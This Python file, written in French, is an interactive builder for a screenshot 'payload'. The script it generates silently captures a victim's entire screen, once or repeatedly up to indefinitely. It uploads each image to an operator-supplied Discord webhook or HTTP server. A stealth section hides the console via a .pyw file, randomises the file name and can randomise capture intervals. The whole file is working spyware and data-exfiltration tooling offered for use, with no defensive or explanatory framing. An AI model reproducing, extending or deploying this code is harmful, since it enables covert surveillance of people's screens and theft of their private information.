import os
from colorama import Fore, Style, init
import time
import random

init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def affichage():
    clear()
    print(Fore.CYAN + "=== Configuration Screenshot ===\n" + Style.RESET_ALL)
    print(f"""
{Fore.YELLOW}--- Fréquence & timing ---
{Fore.WHITE}
    1. Mode de capture        (unique / périodique)
    2. Intervalle de capture  (secondes, mode périodique uniquement)
    3. Nombre max de captures (mode périodique uniquement)
    4. Délai avant première capture

{Fore.YELLOW}--- Envoi ---
{Fore.WHITE}
    5. Envoi sur Discord
    6. Envoi sur serveur HTTP

{Fore.YELLOW}--- Furtivité ---
{Fore.WHITE}
    7. Masquer la console  (.pyw)
    8. Nom du fichier généré

{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
{Style.RESET_ALL}""")

def screenshot_module():
    clear()

    choix = {
        "Mode de capture": "unique",     # "unique" ou "periodique"
        "Intervalle de capture": 60,
        "Nombre max de captures": 10,
        "Délai avant première capture": 0,
        "Envoi sur Discord": None,
        "Envoi sur serveur HTTP": None,
        "Masquer la console": False,     # True = génère un .pyw
        "Nom du fichier": "screenshot_payload",
    }

    # -----------------------------------------------
    # Fonctions de configuration
    # -----------------------------------------------

    def mode_capture_option():
        clear()
        print("Modes disponibles :")
        print("  u = unique     → prend une seule capture puis s'arrête")
        print("  p = périodique → prend des captures en boucle à intervalle régulier\n")
        reponse = input("Mode (u/p) : ").strip().lower()
        if reponse == "u":
            choix["Mode de capture"] = "unique"
            print("Mode défini : unique.")
        elif reponse == "p":
            choix["Mode de capture"] = "periodique"
            print("Mode défini : périodique.")
        else:
            print(Fore.RED + "Répondez par 'u' ou 'p'." + Style.RESET_ALL)
        time.sleep(1)
        affichage()

    def intervalle_option():
        clear()
        val = input("Intervalle entre captures (secondes, 'random' pour 10-120s) : ").strip()
        try:
            if val.lower() == "random":
                choix["Intervalle de capture"] = "random"
                print("Intervalle défini : aléatoire (10-120s).")
            else:
                val = int(val)
                if val < 1:
                    raise ValueError
                choix["Intervalle de capture"] = val
                print(f"Intervalle défini : {val}s.")
            time.sleep(1)
        except ValueError:
            print(Fore.RED + "Entrez un nombre entier positif ou 'random'." + Style.RESET_ALL)
            time.sleep(1)
        affichage()

    def nb_captures_option():
        clear()
        val = input("Nombre maximum de captures (0 = infini) : ").strip()
        try:
            val = int(val)
            if val < 0:
                raise ValueError
            choix["Nombre max de captures"] = val
            print(f"Nombre max défini : {val} ({'infini' if val == 0 else ''}).")
            time.sleep(1)
        except ValueError:
            print(Fore.RED + "Entrez un entier positif ou 0." + Style.RESET_ALL)
            time.sleep(1)
        affichage()

    def delai_option():
        clear()
        val = input("Délai avant la première capture (secondes) : ").strip()
        try:
            val = int(val)
            if val < 0:
                raise ValueError
            choix["Délai avant première capture"] = val
            print(f"Délai défini : {val}s.")
            time.sleep(1)
        except ValueError:
            print(Fore.RED + "Entrez un entier positif." + Style.RESET_ALL)
            time.sleep(1)
        affichage()

    def discord_option():
        clear()
        url = input("URL du webhook Discord : ").strip()
        if url == "":
            print(Fore.RED + "URL vide, annulé." + Style.RESET_ALL)
        else:
            choix["Envoi sur Discord"] = url
            choix["Envoi sur serveur HTTP"] = None  # un seul mode d'envoi à la fois
            print("Webhook Discord enregistré.")
        time.sleep(1)
        affichage()

    def http_option():
        clear()
        url = input("URL du serveur HTTP : ").strip()
        if url == "":
            print(Fore.RED + "URL vide, annulé." + Style.RESET_ALL)
        else:
            choix["Envoi sur serveur HTTP"] = url
            choix["Envoi sur Discord"] = None  # un seul mode d'envoi à la fois
            print("URL HTTP enregistrée.")
        time.sleep(1)
        affichage()

    def masquer_option():
        clear()
        reponse = input("Masquer la console ? (y/n) : ").strip().lower()
        if reponse == "y":
            choix["Masquer la console"] = True
            print("Console masquée activée → fichier .pyw généré.")
        elif reponse == "n":
            choix["Masquer la console"] = False
            print("Console visible → fichier .py généré.")
        else:
            print(Fore.RED + "Répondez par 'y' ou 'n'." + Style.RESET_ALL)
        time.sleep(1)
        affichage()

    def nom_fichier_option():
        clear()
        print("Laissez vide pour un nom aléatoire, ou entrez un nom personnalisé (sans extension).\n")
        val = input("Nom du fichier : ").strip()
        if val == "":
            nom = f"scr_{random.randint(1000, 9999)}"
            choix["Nom du fichier"] = nom
            print(f"Nom aléatoire généré : {nom}")
        else:
            choix["Nom du fichier"] = val
            print(f"Nom défini : {val}")
        time.sleep(1)
        affichage()

    # -----------------------------------------------
    # Liste des options
    # -----------------------------------------------
    options = [
        ("Mode de capture",              mode_capture_option), # 1
        ("Intervalle de capture",        intervalle_option),   # 2
        ("Nombre max de captures",       nb_captures_option),  # 3
        ("Délai avant première capture", delai_option),        # 4
        ("Envoi sur Discord",            discord_option),      # 5
        ("Envoi sur serveur HTTP",       http_option),         # 6
        ("Masquer la console",           masquer_option),      # 7
        ("Nom du fichier",               nom_fichier_option),  # 8
    ]

    # -----------------------------------------------
    # Vérification avant création
    # -----------------------------------------------
    def controle():
        # Il faut au moins un mode d'envoi
        if not choix["Envoi sur Discord"] and not choix["Envoi sur serveur HTTP"]:
            print(Fore.RED + "Erreur : configurez au moins un mode d'envoi (option 5 ou 6)." + Style.RESET_ALL)
            input("\nAppuyez sur Entrée pour continuer...")
            return False
        return True

    # -----------------------------------------------
    # Génération du payload
    # -----------------------------------------------
    def create_payload():

        if not controle():
            return

        # Extension selon masquer_console
        extension = ".pyw" if choix["Masquer la console"] else ".py"
        filename  = choix["Nom du fichier"] + extension

        payload_dir  = os.path.join("Option", "modules", "payload", "payload_created")
        payload_path = os.path.join(payload_dir, filename)
        os.makedirs(payload_dir, exist_ok=True)

        # URL d'envoi (Discord prioritaire, sinon HTTP)
        url_envoi = choix["Envoi sur Discord"] or choix["Envoi sur serveur HTTP"]
        est_discord = bool(choix["Envoi sur Discord"])

        with open(payload_path, "w", encoding="utf-8") as f:

            f.write("import time\n")
            f.write("import io\n")
            f.write("import random\n")
            f.write("from PIL import ImageGrab\n")
            # PIL (Pillow) : bibliothèque pour capturer et manipuler des images
            f.write("import requests\n\n")

            f.write("# ============================================================\n")
            f.write("# Configuration générée automatiquement\n")
            f.write("# ============================================================\n")
            f.write(f"MODE       = {repr(choix['Mode de capture'])}\n")

            # Intervalle : fixe ou aléatoire
            if choix["Intervalle de capture"] == "random":
                f.write("INTERVALLE = None  # sera tiré au sort entre 10 et 120s\n")
            else:
                f.write(f"INTERVALLE = {choix['Intervalle de capture']}\n")

            f.write(f"MAX_CAP    = {choix['Nombre max de captures']}  # 0 = infini\n")
            f.write(f"DELAI      = {choix['Délai avant première capture']}\n")
            f.write(f"URL_ENVOI  = {repr(url_envoi)}\n")
            f.write(f"EST_DISCORD = {est_discord}\n")
            # EST_DISCORD : True = on envoie via webhook Discord (format multipart)
            #               False = on envoie sur un serveur HTTP classique
            f.write("\n")

            f.write("# ============================================================\n")
            f.write("# Fonction d'envoi\n")
            f.write("# ============================================================\n\n")

            f.write("def envoyer(buffer):\n")
            f.write("    \"\"\"Envoie le buffer PNG vers Discord ou HTTP.\"\"\"\n")
            f.write("    buffer.seek(0)\n")
            f.write("    try:\n")
            f.write("        files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
            f.write("        if EST_DISCORD:\n")
            f.write("            # Discord attend le fichier dans 'file' avec un payload_json optionnel\n")
            f.write("            requests.post(URL_ENVOI, files=files)\n")
            f.write("        else:\n")
            f.write("            # Serveur HTTP classique : POST multipart\n")
            f.write("            requests.post(URL_ENVOI, files=files)\n")
            f.write("    except Exception as e:\n")
            f.write("        print(f'Erreur envoi : {e}')\n\n")

            f.write("# ============================================================\n")
            f.write("# Capture\n")
            f.write("# ============================================================\n\n")

            f.write("def prendre_screenshot():\n")
            f.write("    \"\"\"Prend une capture, la stocke dans un buffer en mémoire et l'envoie.\"\"\"\n")
            f.write("    image  = ImageGrab.grab()    # capture l'écran entier\n")
            f.write("    buffer = io.BytesIO()         # buffer en RAM, pas de fichier sur disque\n")
            f.write("    image.save(buffer, format='PNG')\n")
            f.write("    envoyer(buffer)\n\n")

            f.write("def lancer():\n")
            f.write("    if DELAI > 0:\n")
            f.write("        print(f'Attente de {DELAI}s avant la première capture...')\n")
            f.write("        time.sleep(DELAI)\n\n")

            f.write("    if MODE == 'unique':\n")
            f.write("        # Une seule capture puis on quitte\n")
            f.write("        prendre_screenshot()\n\n")

            f.write("    elif MODE == 'periodique':\n")
            f.write("        # Boucle de capture\n")
            f.write("        # MAX_CAP == 0 → infini, sinon on s'arrête après MAX_CAP captures\n")
            f.write("        compteur = 0\n")
            f.write("        try:\n")
            f.write("            while MAX_CAP == 0 or compteur < MAX_CAP:\n")
            f.write("                prendre_screenshot()\n")
            f.write("                compteur += 1\n")

            if choix["Intervalle de capture"] == "random":
                f.write("                attente = random.randint(10, 120)\n")
            else:
                f.write("                attente = INTERVALLE\n")

            f.write("                print(f'Capture {compteur} envoyée. Prochaine dans {attente}s.')\n")
            f.write("                time.sleep(attente)\n")
            f.write("        except KeyboardInterrupt:\n")
            f.write("            print('\\nArrêt.')\n\n")

            f.write("if __name__ == '__main__':\n")
            f.write("    lancer()\n")

        print(Fore.GREEN + f"Payload généré : {payload_path}" + Style.RESET_ALL)
        print(Fore.YELLOW + "Dépendance requise : pip install pillow requests" + Style.RESET_ALL)
        input("\nAppuyez sur Entrée pour continuer...")

    # -----------------------------------------------
    # Boucle principale
    # -----------------------------------------------
    while True:
        affichage()
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL).strip()

        if cmd.lower() == "exit":
            break

        elif cmd.lower().startswith("set "):
            try:
                option_choix = int(cmd.split()[1]) - 1
                if 0 <= option_choix < len(options):
                    options[option_choix][1]()
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
                    time.sleep(1)
            except (ValueError, IndexError):
                print(Fore.RED + "Veuillez saisir 'set <num>'" + Style.RESET_ALL)
                time.sleep(1)

        elif cmd.lower() == "show":
            clear()
            print(Fore.CYAN + "\nConfiguration actuelle :\n" + Style.RESET_ALL)
            for option, value in choix.items():
                couleur = Fore.GREEN if value not in (None, False, 0) else Fore.RED
                print(f"  {option:35s} : {couleur}{value}{Style.RESET_ALL}")
            input("\nAppuyez sur Entrée pour continuer...")

        elif cmd.lower() == "create":
            create_payload()

        else:
            print(Fore.RED + "Commande inconnue." + Style.RESET_ALL)
            time.sleep(1)

if __name__ == "__main__":
    screenshot_module()